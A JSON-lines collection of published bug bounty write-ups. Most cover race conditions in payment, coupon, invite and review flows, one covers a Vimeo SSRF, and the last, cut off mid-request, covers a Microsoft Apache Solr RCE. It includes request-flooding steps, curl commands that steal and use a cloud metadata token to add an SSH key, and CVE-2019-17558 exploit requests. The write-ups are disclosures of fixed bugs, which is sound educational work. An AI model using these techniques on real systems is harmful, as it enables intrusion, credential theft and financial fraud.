{"source_url": "https://www.josipfranjkovic.com/blog/race-conditions-on-web", "title": "Race conditions on the web -  Josip Franjković", "friendly_explanation": "This is a bug bounty writeup from https://www.josipfranjkovic.com/blog/race-conditions-on-web. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nRace conditions on the web - Josip Franjković Josip Franjković web security consultant Blog Bug bounties Race conditions on the web written on July 12th, 2016 The goal of this blog post is to raise awareness about race condition attacks in both developers and security people, because I feel like not many know about this kind of bug - I have participated in CTFs whose points system was vulnerable to race conditions (even Facebook’s CTF platform was ). All examples I wrote about were found in public bug bounty programs and are fixed. At the bottom of the page is a compilation of tools and posts for further reading. Enjoy! Stealing BitCoin from Cobalt.io Cobalt is a bug bounty platform that offers payouts in BitCoin and PayPal. Their BitCoin withdrawal flow was vulnerable to a race condition attack which could be used to withdraw one bounty multiple times. Check out the original report here: https://cobalt.io/cobalt/cobalt/reports/587 Confirming any unused email address on Facebook This was an unusual race condition which could be exploited to confirm any unused email address on Facebook. During February, I was testing the mobile registration flow on Facebook, and somehow succeeded to confirm a random email address. I reported this to Facebook hoping they’d be able to debug it, since I did not understand how it happened, and made ~5000 requests before realizing the email was confirmed. On April 20th I re-tested the flow and finally got reliable proof of concept: Register a new account, but do not confirm the email or phone Obtain a Facebook-issued access_token for the new account Create multiple requests at the same time to api.facebook.com/method/user.editregistrationcontactpoint while changing the add_contactpoint POST parameter you should change add_contactpoint between an email you have access to, and one you do not, for example [email protected] and [email protected] On [email protected] you will receive a confirmation link that will look like this: / [email protected] & c= 13475& code= 84751 The GET parameter “c” is always the code for your email address, but the “code” parameter confirms the one you do not have acces to ( [email protected] ). After obtaining the code, you can go to Facebook settings and confirm the email. The bug was fixed on May 10th, 2016, and is my favorite report to Facebook. Adding multiple single-use coupons to one Facebook ad account During the final three months of 2014, Facebook announced they’d be giving double bounties for any ads-related bugs, so I started poking around and found a (minor) bug in how they handled ad coupons. Some coupons can be used only once, and a single ads account should be able to redeem only one ad coupon. Using race conditions, I could add multiple ad coupons to a single account. Bear in mind that this bug did not enable me to re-use single coupon multiple times or on different accounts. To exploit this bug, you would need to buy a couple ad coupons, and try to redeem them at the same time on one account. Multiple coupons would then be available for you to spend, which obviously breaks the one coupon per account rule. The interesting thing about this report is the timeline: October 20, 2014: Bug reported to Facebook October 22, 2014: Facebook is looking into the issue December 2014: Many messages back and forth between Facebook and me; they were not able to reproduce this issue. I was at fault here, because the steps were not clearly explained in my report. Looking back, I should have attached my POST requests and server responses for easier analysis. February 13, 2015: Update from Facebook, they still are not able to reproduce this, but have checked the code and believe vulnerability is present. Facebook apologizes for the high latency so far. April 22, 2015: Facebook still not able to reproduce it. They ask me if the bug is still present. I have no way to buy coupon codes, and inform Facebook it is impossible for me to re-test it. At this point I gave up on the report because there was no way for me to prove the vulnerability, and Facebook had no luck reproducing it. But… September 23, 2015: Facebook informs me they have fixed the bug, and ask me to confirm it September 24, 2015: After a lot of Googling I get my hands on a couple coupon codes, and try out the race condition. It is now fixed. A couple days later, Facebook closed the report: I think this bug is not worth $7500, so I asked Facebook for an explanation of the bounty. Their reply: Mega.nz coupons and purchasing race conditions Mega was vulnerable to a coupons reuse race condition, very similar to one I found in DigitalOcean ( writeup ). The other bug was present in the purchasing logic. When you purchase Mega premium, a request is made to their API server eu.api.mega.co.nz/cs , which lowers balance and adds premium time. By sending multiple requests you could buy the premium multiple times, while your balance would go to negative values - this was not an intended functionality. Mega rewarded me with a 250EUR bounty, which I told them to donate to LetsEncrypt. Cheating Keybase invites system First bug was present when generating invites for different emails. Let us assume you have 1 invite on your Keybase account. You could bypass the invitation limit by sending a bunch of POST requests with different email values to an API endpoint. Original report with the steps: https://hackerone.com/reports/115007 Couple months later I saw Keybase re-designed the system, and tried the same attack. It did not work, but a new bug was introduced to the registration flow, using which you could register multiple users while redeeming one invite. Original report: https://hackerone.com/reports/148609 Closing words and further reading Here are some links if you want to read more about race conditions: @DefuseSec's blog post, includes theory and examples A tool to explot race conditions by @w3af Gift card reuse on Starbucks, by @homakov Manipulating Medium's top stories, by Jack Cable My old post about bugs in Facebook, DigitalOcean, LastPass A writeup on an interesting CTF challenge, by @EdgarBoda of KITCTF team Concurrency Attacks on Web Application, a video from BlueHat by @ScottStender and Alex Vidergar A big thanks to all the companies listed for allowing me to write about those reports, and to you for reading! Random blog post Bug bounties Taking over Facebook accounts using Free Basics partner portal written on February 7th, 2018 Read more Josip Franjković web security consultant I enjoy breaking websites and participating in various bug bounty programs. You can contact me using: @JosipFranjkovic (DM open to everyone) [email protected] keybase.io/josipfranjkovic All rights reserved © 2018. — Josip Franjković"}
{"source_url": "https://medium.com/@arbazhussain/race-condition-bypassing-team-limit-b162e777ca3b", "title": "Race Condition bypassing team limit | by Arbaz Hussain | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@arbazhussain/race-condition-bypassing-team-limit-b162e777ca3b. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nRace Condition bypassing team limit | by Arbaz Hussain | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Race Condition bypassing team limit Arbaz Hussain 1 min read · Jul 20, 2017 -- 1 Listen Share Severity: Medium Complexity: Easy Weakness: Race condition While testing one of the application, they have functionality to create team and invite user’s to team . they have free limit of inviting 5 user’s to team.If you want to invite more user’s , they will ask you to upgrade you’r plan to pro. Request while adding member to our team. Request: POST /account/work/team/ HTTP/1.1 Host: www.site.com User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0 Accept: application/json, text/javascript, */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Content-Type: application/x-www-form-urlencoded Referer: https://www.site.com/home/work/team/manage Content-Length: 108 Cookie: <REDACTED> Connection: close emails= xxxxxxx@gmail.com &team=name&authenticity_token=<> Sending the Request to Burp Intruder By Adding Email List to emails= Parameter. Setting Minimum Thread Speed(10–15) and Start Attack. Result: Press enter or click to view image in full size Bypassed the limit to 22 Increasing Threading to ~10 will send 10 request’s at the same time. this will generate a type confusion which bypassed their team limit. JavaScript -- -- 1 Written by Arbaz Hussain 2K followers · 411 following Security Analyst Responses ( 1 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@rootxharsh_90844/vimeo-ssrf-with-code-execution-potential-68c774ba7c1e", "title": "Vimeo SSRF with code execution potential. | by Harsh Jaiswal | InfoSec Write-ups", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@rootxharsh_90844/vimeo-ssrf-with-code-execution-potential-68c774ba7c1e. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nVimeo SSRF with code execution potential. | by Harsh Jaiswal | InfoSec Write-ups Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in InfoSec Write-ups · Follow publication A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow publication Vimeo SSRF with code execution potential. Harsh Jaiswal 4 min read · Mar 8, 2019 -- 7 Listen Share Recently I discovered a semi responded SSRF on Vimeo with code execution possibility. This blog post explains how I found & exploited it. So let's get started. Background. Vimeo provides an API console for their API called API Playground , The requests made using this web app is done from server-side. Take the bellow request as an example. Press enter or click to view image in full size Base request This request is supposed to make a server-side GET request to https://api.vimeo.com/users/{user_id}/videos/{video_id} If you look closely to the request we control quite of things here, First the uri parameter which is the endpoint to hit on endpoint i.e. in this case is /users/{user_id}/videos/{video_id} , Request method i.e., in this case, is set to GET , params which are supposed to be post parameters if the request method is POST. user_id & video_id are kind of variables whose values gets defined in segments parameter. Path traversal in HTTP requests made on server side. I first tried to change URI parameter to my custom path however any change in URI will result in a 403, Means that they’re allowing a set of API endpoints. However, changing the value of variables such as user_id & videos_id is possible because they’re intentional and because these values reflect in the path of URL. Passing ../../../ will result in a request to ROOT of api.vimeo.com Below is what happens. URL.parse(“https://api.vimeo.com/users/1122/videos/../../../attacker”) Result: https://api.vimeo.com/attacker Press enter or click to view image in full size Path traversal in HTTP requests made on server side As you can see in response all endpoints of api.vimeo.com is listed which is root response of api.vimeo.com if you make an authenticated request (with authorization header). What now? We’re still on api.vimeo.com host, how do we escape it? Well, I figured that this is following HTTP 30X redirects, Its a long story took a Lil bit of logical thinking. Back to the point, Now I know this is following HTTP redirects and we’re good to move forward, We need an open redirect so that we can redirect server to our controlled asset. The good old content discovery… A minute of content discovery and I came across an endpoint on api.vimeo.com which makes a redirection to vimeo.com with our controlled path on vimeo.com https://api.vimeo.com/m/something Press enter or click to view image in full size api.vimeo.com to vimeo.com Cool, Now we have a wide scope to find an open redirect, I have a not very useful open redirect on vimeo.com, I won't be disclosing its details but let's just assume it is something like this https://vimeo/vulnerable/open/redirect?url=https://attacker.com This makes a 302 redirect to attacker.com, Chain completed to redirect to attacker asset.. The final payload to redirect the server to our controlled asset is ../../../m/vulnerable/open/redirect?url=https://attacker.com Passing this value inside video_id will parse URL in this way https://api.vimeo.com/users/1122/videos/../../../m/vulnerable/open/redirect?url=https://attacker.com Which on parsing becomes https://api.vimeo.com/m/vulnerable/open/redirect?url=https://attacker.com HTTP redirection made & followed to https://vimeo.com/vulnerable/open/redirect?url=https://attacker.com Another HTTP redirection made & followed to https://attacker.com Press enter or click to view image in full size SSRF Achieved, Redacted details regarding the open redirect and my domain. The server expects a JSON response and parses it and shows in response. Exploiting.. As Vimeo infrastructure is on Google cloud, My first attempt was to hit the Google metadata API. I followed the approach taken by André Baptista (0xacb) This endpoint gives us service account token. http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token ?alt=json { “headers”: [ “HTTP/1.1 200”, “Content-Type: application/json”, “Host: api.vimeo.com” ], “code”: 200, “body”: { “access_token”: “ya29.c.EmKeBq9XXDWtXXXXXXXXecIkeR0dFkGT0rJSA”, “expires_in”: 2631, “token_type”: “Bearer” } } Scope of token $ curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=ya29.XXXXXKuXXXXXXXkGT0rJSA Response: { \"issued_to\": \"101302079XXXXX\", \"audience\": \"10130207XXXXX\", \"scope\": \"https://www.googleapis.com/auth/compute https://www.googleapis.com/auth/logging.write https://www.googleapis.com/auth/devstorage.read_write https://www.googleapis.com/auth/monitoring\", \"expires_in\": 2443, \"access_type\": \"offline\" } I could then use this token to add my public SSH key to the instance and then connect via my private key $ curl -X POST “https://www.googleapis.com/compute/v1/projects/1042377752888/setCommonInstanceMetadata\" -H “Authorization: Bearer ya29.c.EmKeBq9XI09_1HK1XXXXXXXXT0rJSA” -H “Content-Type: application/json” — data ‘{“items”: [{“key”: “harsh-bugdiscloseguys”, “value”: “harsh-ssrf”}]} Response: { “kind”: “compute#operation”, “id”: “63228127XXXXXX”, “name”: “operation-XXXXXXXXXXXXXXXXXX”, “operationType”: “compute.projects.setCommonInstanceMetadata”, “targetLink”: “https://www.googleapis.com/compute/v1/projects/vimeo-XXXXX\", “targetId”: “10423XXXXXXXX”, “status”: “RUNNING”, “user”: “10423XXXXXXXX-compute@developer.gserviceaccount.com”, “progress”: 0, “insertTime”: “2019–01–27T15:50:11.598–08:00”, “startTime”: “2019–01–27T15:50:11.599–08:00”, “selfLink”: “https://www.googleapis.com/compute/v1/projects/vimeo-XXXXX/global/operations/operation-XXXXXX\"} And… Press enter or click to view image in full size keys added Press enter or click to view image in full size *Le me However, SSH port was open on the internal network only :(( but this was enough to prove that internally this can be escalated to shell access. Kubernetes keys were also extracted from metadata API, but for some reason, I was not able to use them, Although the Vimeo team did confirm they were valid. Due to my work & involvement with Vimeo, I was allowed to go deeper than would normally have been allowed. That’s it, folks. I hope you liked this. Share/Re-Tweet is much appreciated, Have any questions regarding this? DM @ rootxharsh Thanks to; Vimeo team for allowing disclosure of this issue. Andre (0xacb) for his awesome report Brett (bbuerhaus) for his write up about this SSRF (He and Ben have some lit AF writeups) Timeline 28th Jan early morning: Initial discovery. 28th Jan: Triaged by HackerOne team 28th Jan: Vimeo team rewarded initial $100 and pushed a temporary fix. 30th/31st Jan: Permanent fix pushed 1st Feb: $4900 rewarded. API Bug Bounty Ssrf -- -- 7 Follow Published in InfoSec Write-ups 67K followers · Last published 18 hours ago A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow Written by Harsh Jaiswal 836 followers · 3 following AppSec at Vimeo, Bug Bounty in free time :) Responses ( 7 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://josipfranjkovic.blogspot.com/2015/04/race-conditions-on-facebook.html", "title": "Josip Franjković - archived security blog: Race conditions on Facebook, DigitalOcean and others (fixed)", "friendly_explanation": "This is a bug bounty writeup from https://josipfranjkovic.blogspot.com/2015/04/race-conditions-on-facebook.html. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nJosip Franjković - archived security blog: Race conditions on Facebook, DigitalOcean and others (fixed) Josip Franjković - archived security blog Monday, 27 April 2015 Race conditions on Facebook, DigitalOcean and others (fixed) Hello, Lately I have been looking into race condition bugs affecting websites/web-applications. Here is a good resource to learn about them - includes theory, vulnerable code, proof of concept code and ways to fix. I highly recommend you read it: https://defuse.ca/race-conditions-in-web-applications.htm Below are couple of my reports ranging from benign to pretty high severity. Facebook bug 1: inflating page reviews using a single account. Some Facebook pages have a review system, where you can rate the page 1-5 stars and add textual description. Each user is allowed to rate only once, and you can edit or delete your review later. Using race conditions you could rate a page multiple times, then delete one of your reviews, and then rate again. This allowed me to inflate or deflate ratings of any page. Here is my report to Facebook, slightly edited: Using your account go to Page URL and add a review with 5 stars, but intercept the /ajax/pages/review/add request Send out as many /ajax/pages/review/add requests as you can in shortest possible time frame. The reviews will jump to some number > 1 (depending on luck and how much requests you sent), lets say it is 5 reviews. Go to Page once again, and go to All reviews. Delete the one review by you (only one rating will be deleted). Now page has 4 reviews Create a new review with same user, and repeat steps 1-6. You now have a really well-rated Page. Report timeline: April 14, 2014 - Bug reported to Facebook April 15, 2014 - Confirmation from Facebook's security team April 27, 2014 - Pinged Facebook team thinking this was fixed, but it was not :-) June 15, 2014 - Bug is now fixed I believe this was one of first race condition bugs reported to Facebook, as I found no other write-ups online, and this is what Facebook's team told me: \"Out of curiosity, has anyone reported any similar bugs to this one - some kind of race condition? \" - not recently. In the past they may have, but I cannot tell for sure. Facebook bug 2: creating multiple usernames for a single account The principle behind this bug is same as previous one; send as many requests to an endpoint with a list of wanted usernames. Some will go through, others will not. Here is my test account with two usernames: https://graph.facebook.com/rpert.grint.6 https://graph.facebook.com/rpert.grint.7 This bug was fixed, but a bounty was not awarded. Here is the original reply from Facebook: The issue you describe is not a security issue. Reporting this issue is not eligible for a bug-bounty. However, we have made changes to the codebase and the issue should no longer be present. Report timeline: April 14, 2014 - Bug reported to Facebook October 16, 2014 - Confirmation of fix There are some more minor bugs that I have found, but none of them have a real security impact, so I did not report them. I have one more race condition bug reported to Facebook, but Facebook team had trouble reproducing it. I will edit the write-up when/if it gets fixed. DigitalOcean bug: making money out of thin air This was a fun one. Basically, I reused one promo code multiple times using race conditions. Here is the report: Create an account and find a working promo code Go to your billing management page Paste your promo code into input field A POST request to https://cloud.digitalocean.com/promos will be made. Send this POST request many times in short time frame - best to multithread it. Money will be added multiple times to your account. Report timeline: January 11, 2015 - DigitalOcean security contacted with a report January 13, 2015 - Confirmation from DigitalOcean team January 21, 2015 - Bug is fixed. At the time of report I did not have a $100 promo code from GitHub's education pack, but I believe it would get redeemed multiple times, too. I did not get a separate bounty for this report, but DigitalOcean team let me keep my test accounts with ~550$ total. Here is a screenshot from one of accounts where codes have been redeemed multiple times. Unfortunately, I lost email for this account... Similar promo code race conditions were reported to many other companies, with LastPass team being fastest to fix the issue - it only took them 3 days. They have also let me keep the premium time on my account, and confirmed no-one abused the bug prior to my report. I'd like to thank Facebook, DigitalOcean and LastPass security teams for being responsive to my reports, and rewarding me for them! Giant thanks to Team Tasteless, too. Check out their web hacking challenges , you might learn a lot there. I sure did :-) Join the discussion on /r/netsec or HackerNews ! Posted by Josip Franjković at 02:11 Email This BlogThis! Share to X Share to Facebook Share to Pinterest 10 comments: Unknown 27 April 2015 at 05:19 Damn you're a G Reply Delete Replies Reply Unknown 27 April 2015 at 08:47 that is badass Reply Delete Replies Josip Franjković 27 April 2015 at 16:50 Thanks :-) Delete Replies Reply Reply Unknown 27 April 2015 at 08:47 that is badass Reply Delete Replies Josip Franjković 27 April 2015 at 16:50 Thanks :-) Delete Replies Reply Reply Unknown 27 April 2015 at 19:36 Wow! That is really cool. You are a smart guy! Reply Delete Replies Reply Matheus Cavalieri 27 April 2015 at 20:19 So good! ;) Smart guy! Reply Delete Replies Reply Paulos Yibelo Mesfin 28 April 2015 at 06:50 Nice finds dude! :) Reply Delete Replies Reply Anonymous 3 May 2015 at 13:09 Genious Reply Delete Replies Reply Anonymous 7 May 2015 at 13:48 Its a nice blog.its really helpful for visitor...................... Thanks Website security audit Reply Delete Replies Reply Add comment Load more... Note: only a member of this blog may post a comment. Newer Post Older Post Home Subscribe to: Post Comments (Atom) About me I enjoy breaking websites. Contact: josip[dot]franjkovic[at]gmail[dot]com You can follow me on Twitter ! New blog: josipfranjkovic.com Blog Archive ► 2016 (1) ► July (1) ▼ 2015 (2) ► July (1) ▼ April (1) Race conditions on Facebook, DigitalOcean and othe... ► 2014 (2) ► December (1) ► September (1) ► 2013 (4) ► November (1) ► July (2) ► January (1) Simple theme. Powered by Blogger ."}
{"source_url": "https://medium.com/@ciph3r7r0ll/race-condition-bug-in-web-app-a-use-case-21fd4df71f0e", "title": "Race Condition Bug In Web App: A Use Case | by Mandeep Jadon | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@ciph3r7r0ll/race-condition-bug-in-web-app-a-use-case-21fd4df71f0e. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nRace Condition Bug In Web App: A Use Case | by Mandeep Jadon | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Race Condition Bug In Web App: A Use Case Mandeep Jadon 4 min read · Apr 24, 2018 -- 5 Listen Share Hey guys Today I am going to write about a specific vulnerability that i found in some of the web applications I came across . The vulnerability is race condition . Background Just to give a brief background about what actually a race condition is . A race condition occurs when multiple threads simultaneously access the same shared code/resource without locking or synchronization . This may result in inconsistency of the output. While developing the application the developer things that the concurrency is managed by the server itself while the server guys think that the devs would be responsible for dealing with concureent thread execution . So its like a typical IT company situation . 😁 Following diagram shows the execution of processes over the same shared resource . Source : https://securingtomorrow.mcafee.com/technical-how-to/testing-race-conditions-web-applications/ A theoretical example Citing a race condition example directly from Owasp Race conditions may occur when a process is critically or unexpectedly dependent on the sequence or timings of other events. In a web application environment, where multiple requests can be processed at a given time, developers may leave concurrency to be handled by the framework, server, or programming language. The following simplified example illustrates a potential concurrency problem in a transaction web application and relates to a joint savings account in which both users (threads) are logged into the same account and attempting a transfer. Account A has 100 credits. Account B has 100 credits. Both User 1 and User 2 want to transfer 10 credits from Account A to Account B. If the transaction was correct the outcome should be: Account A has 80 credits. Account B has 120 credits. However, due to concurrency issues, the following result could be obtained: User 1 checks the value of Account A (=100 credits) User 2 checks the value of Account A (=100 credits) User 2 takes 10 credits from Account A (=90 credits) and put it in Account B (=110 credits) User 1 takes 10 credits from Account A (Still believed to contain 100 credits) (=90 credits) and puts it into Account B (=120 credits). Result: Account A has 90 credits. Account B has 120 credits. Bug That I found While there were many race condition bugs that I found which were pretty straight forward to exploit but I would be discussing about one specific bug that would give you an overview as to where to search for these kinda bugs and what all techniques you can use if you are haulted somewhere . Accessing multiple consoles by free user So there was this site that provides free consoles to the users and some limited space and bandwidth . It had 3 tiers of accounts . A free account , and 2 paid accounts having different set of benefits . One restriction of the free account was the no. of consoles the user can create . It was limited to 2 consoles / user . When you create a console a get request to the creation of the console was sent .At seeing this i thought would it be possible for the attacker to bypass this limited no. of consoles . I fired up the intruder with maximum possible no. of threads and started to intrude the GET request (Using Null payloads ) to see what the server will behave . Unfortunately this didn’t worked well . I was getting valid response for the first two requests . Then after that I started getting fixed length responses saying that the console limit is reached . Limit Reached Now the problem with race condition bugs is that its not executed in one go . It depends on various types of factors like current no. of threads on the server , the load on the server , your own internet speed and other factors . I tried shooting that request multiple times with over 100 threads but I got the same reply from the server . (Only two consoles were created ) . Then I tried the following workaround : I tried simulating the same attack but this time I removed one of the console manually from the UI while the threads were being executed . As you can see in the following screenshot that 3 requests got the same response . So we successfully bypassed the console limit of the free account . 3 Requests executed Finally Success So the key factors that are to be kept in mind are: Race condition bugs are mostly on those endpoints which deal with adding/removing/changing of a particular resource . They may /may not be replicated on one go . Try again and again . The best use case is to test is by executing parallel threads and making changes on the particular resource at the same time . There are higher chances you can get it executed . Ideally you should shoot up 100+ threads (If you are testing in burp). Thanks for reading ! Have a great day :) Web Development Web Application Security Security -- -- 5 Written by Mandeep Jadon 331 followers · 3 following Cybersecurity Enthusiastic | Bathroom Singer l Writer | Bug Hunter | Into Memes :) Responses ( 5 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/swlh/hacking-banks-with-race-conditions-2f8d55b45a4b", "title": "Hacking Banks With Race Conditions | by Vickie Li | The Startup | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/swlh/hacking-banks-with-race-conditions-2f8d55b45a4b. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nHacking Banks With Race Conditions | by Vickie Li | The Startup | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in The Startup · Get smarter at building your thing. Follow to join The Startup’s +8 million monthly readers & +772K followers. Hacking Banks With Race Conditions How race conditions compromise the security of financial sites Vickie Li 6 min read · Feb 27, 2020 -- 1 Listen Share Press enter or click to view image in full size Photo by Victoire Joncheray on Unsplash One of the biggest threats to modern online banking is a type of vulnerability called race conditions. These vulnerabilities stem from simple programming mistakes that developers commonly make. And these mistakes have proved costly: race conditions have been used by hackers to steal money from online banks, stock brokerages, and cryptocurrency exchanges. (They have also been used by hackers to drink unlimited coffee at Starbucks, as you’ll soon see in this post!) Today, let’s talk about how and why these vulnerabilities happen, how attackers have exploited it, and how to prevent it in your own applications. Crash Course Concurrency In computer science, concurrency is the ability for different parts of a program to be executed simultaneously without affecting the final outcome of the computation. When a program is developed with concurrency in mind, it can take full advantage of modern multithreading and multiprocessing systems, and thus drastically improve its performance. Multithreading is the ability of a CPU to provide multiple threads of execution. These threads don’t all execute at the same time but take turns using the CPU’s computational power. With multithreading, other threads can continue taking advantage of the unused computing resources while they are idle. (For example, when the original thread is suspended while waiting for input or output to complete.) While multiprocessing refers to the usage of multiple CPUs for computation at the same time. Arranging the sequence of execution of multiple threads is called scheduling. There are many different scheduling algorithms in use, each optimized for different performance priorities. What is a Race Condition? In computing, a race condition happens when two sections of code that are designed to be executed in a sequence were executed out of sequence. Since the scheduling algorithm can swap between the execution of two threads at any time, you can’t predict the sequence in which the threads execute each action. For example, let’s say that two concurrent threads of execution are each trying to increase the value of a global variable by 1. So in the end, the global variable will have the value of 2. (The example is taken from the Wikipedia page: https://en.wikipedia.org/wiki/Race_condition ) Ideally, the threads would be executed as such: But, if the two threads are run simultaneously, without resource locks (a mechanism that blocks other threads from operating on the same resource) or synchronization (a mechanism that ensures that threads that utilize the same resources so not execute simultaneously), the execution could be scheduled like this: Press enter or click to view image in full size In this case, the final value of the global variable becomes 1, which is incorrect. (The expected value is 2.) This happens because the outcome of the execution of one thread depends on the outcome of another thread. When the two threads are executed simultaneously, unexpected outcomes can occur. What is a Race Condition Vulnerability? A race condition becomes a vulnerability when it affects a security control mechanism. Hackers can then induce a situation in which a sensitive action is executed before a security control is complete. For this reason, race condition vulnerabilities are also referred to as Time of Check/Time of Use vulnerabilities . Imagine if the two threads of the above example are executing something a little more sensitive: the transferring of money between bank accounts. The application would have to perform three subtasks to transfer the money correctly: Check if account A has enough balance. Add the money to account B. Deduct the money from account A. Let’s say that you own two bank accounts, account A and account B . You have $500 in account A and $0 in account B. Now, you initiate two money transfers of $500 from account A to account B. Ideally, when two money transfer requests were initiated, the program should behave like this. Press enter or click to view image in full size But if you can send the two request simultaneously, you might be able to induce a situation in which the execution of the threads become like this: Press enter or click to view image in full size Note that in this scenario, you end up with more money than you started with! You essentially made an additional $500 appear out of thin air by exploiting a race condition vulnerability. Case Study: Unlimited Starbucks Coffee A cool example of how race conditions have been exploited in real life was the Starbucks hack by security researcher Egor Homakov. By exploiting a race condition on the gift card page, he found a way to generate an unlimited amount of credit on Starbucks gift cards for free. This vulnerability lies in the functionality that transfers the gift card balance from one card to another. The website uses the following POST request to transfer credit: POST /step1?amount=5&from=card_A&to=card_B When this request is sent multiple times within a small time frame, the hacker can induce a situation in which he can transfer more money into card B than the account balance that he has on card A. This means that when executed for many times, this attack generates unlimited amounts of money on card B for free. The root cause of this attack is a race condition between these three actions: Check that card A has enough money to be transferred. Transfer that amount to card B. Deduct the balance of card A. This is the breakdown of the race condition that caused the vulnerability: Press enter or click to view image in full size You can read more about the fun details of the exploit here. Hacking Starbucks for unlimited coffee This is a story about how I found a way to generate unlimited amount of money on Starbucks gift cards to get life-time… sakurity.com High-Risk Applications Race conditions are used as a way to subvert access controls. So in theory, any application that has sensitive actions that rely on access control mechanisms could be vulnerable. Most of the time though, hackers target race conditions on the websites of financial institutions. Because if a race condition could be found on a critical functionality like cash withdrawal, fund transfer or credit card payment, it could lead to infinite financial gains for the hacker. Other high-risk applications include e-commerce sites, online games, and online voting systems. Additionally, if an exploitable race condition was ever found on a site, it is possible that the site does not follow secure programming practices and thus the likelihood of it being vulnerable again is high. Exploiting Race Conditions Most of the time, you can test for and exploit race conditions in web apps by sending multiple requests to the server simultaneously. Bank Account balance: 3000 For example, if you want to see if you can withdraw more money than you have in your bank account, you can simultaneously send multiple requests for withdrawal to the server via the curl command. curl (withdraw 3000) & (withdraw 3000) & (withdraw 3000) & (withdraw 3000) & (withdraw 3000) & (withdraw 3000) Note that whether your attack succeeds or not would depend on the process scheduling algorithm of the server and is a matter of luck. However, the more requests you send within a short time frame, the better the odds that your attack will succeed. Preventing Race Conditions The key to preventing race conditions is to implement safe concurrency. And the best way to do this is by using resource locks. Most programming languages that have concurrency abilities will also have some sort of locking functionality built-in. Please refer to the documentation of your chosen language to learn how to do it! Beyond that, following secure coding practices (like the least privilege principle) and auditing code on a regular basis will reduce the likelihood of your application being hacked! Thanks for reading. And remember: trying this on systems where you don’t have permission to test is illegal. If you’ve found a vulnerability, please disclose it responsibly to the vendor. Help make our Internet a safer place. Is there anything I missed? Feel free to let me know on Twitter . Vickie Li The latest Tweets from Vickie Li (@vickieli7). Professional investigator of nerdy stuff. Hacks and secures. Creates god… twitter.com Technology Cybersecurity Web Development Software Development Programming -- -- 1 Published in The Startup 855K followers · Last published 10 hours ago Get smarter at building your thing. Follow to join The Startup’s +8 million monthly readers & +772K followers. Written by Vickie Li 18.8K followers · 24 following Professional investigator of nerdy stuff. Hacks and secures. Creates god awful infographics. https://twitter.com/vickieli7 Responses ( 1 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://blog.securitybreached.org/2020/03/31/microsoft-rce-bugbounty/", "title": "Microsoft Apache Solr RCE Velocity Template | Bug Bounty POC - Security Breached Blog", "friendly_explanation": "This is a bug bounty writeup from https://blog.securitybreached.org/2020/03/31/microsoft-rce-bugbounty/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nMicrosoft Apache Solr RCE Velocity Template | Bug Bounty POC - Security Breached Blog Skip to content Security Breached Blog Hack Smart, Stay Safe: Comprehensive Guides to Cybersecurity and Bug Bounty March 31, 2020 Share BugBounty POC 3 Microsoft Apache Solr RCE Velocity Template | Bug Bounty POC by MuhammadKhizerJaved Hey guys so this blog post is about RCE issue reported to Microsoft bug bounty program, Remote Code execution issue existed in microsoft.com subdomain running Apache Solr. I’ll try to be as simple as possible. Participated in Microsoft Bug Bounty Program first time.. About the RCE: While doing some recon on microsoft.com website i found a subdomain http://tide90.microsoft.com/ doing a basic port scan using nmap (nmap -A tide90.microsoft.com ) Showed that port 8983 was open and running Apache Solr, Normally companies run Apache Solr Admin dashboard behind there VPN or is protected by a Login, but on Microsoft it wasn’t protected at all thus just going to http://tide90.microsoft.com:8983/ Took me to Admin Dashboard. Apache Solr versions 5.0.0 to 8.3.1 are affected by this vulnuberilty CVE-2019-17558 , To get an RCE on vulnuberal Apache Solr instance you need to trigger it in two steps. First, the attacker needs to modify the “ params.Resource.Loader.Enabled ” configuration item to True through the config API. Sending the Following POST request modified the value POST /solr/ZigmaCore/config HTTP/1.1 Host: tide90.microsoft.com:8983 User-Agent: Mozilla/5.0 (Windows NT 10.0; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4086.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 Content-Length: 261 { “update-queryresponsewriter”: { “startup”: “lazy”, “name”: “velocity”, “class”: “solr.VelocityResponseWriter”, “template.base.dir”: “”, “solr.resource.loader.enabled”: “true”, “params.resource.loader.enabled”: “true” } } Then complete the vulnerability trigger by sending a malicious velocity template via GET request with custom velocity template parameter in a specially crafted Solr request, leading to RCE GET /solr/dovecot/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27) 